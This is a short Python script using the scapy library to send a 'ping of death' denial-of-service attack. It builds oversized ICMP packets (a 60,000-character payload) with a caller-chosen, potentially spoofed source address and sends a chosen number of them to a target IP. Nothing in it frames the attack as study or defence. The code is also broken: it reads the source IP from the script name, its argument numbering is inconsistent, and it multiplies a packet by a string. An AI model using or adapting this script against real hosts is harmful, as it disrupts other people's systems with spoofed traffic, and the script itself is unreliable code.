#!/usr/bin/python

from scapy.all import *

print(sys.argv[1], sys.argv[2], sys.argv[3])
# Change according with your IP addresses

SOURCE_IP=str(sys.argv[0])
TARGET_IP=str(sys.argv[1])
MESSAGE="T"
NUMBER_PACKETS=str(sys.argv[2]) # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
send(NUMBER_PACKETS*pingOFDeath)
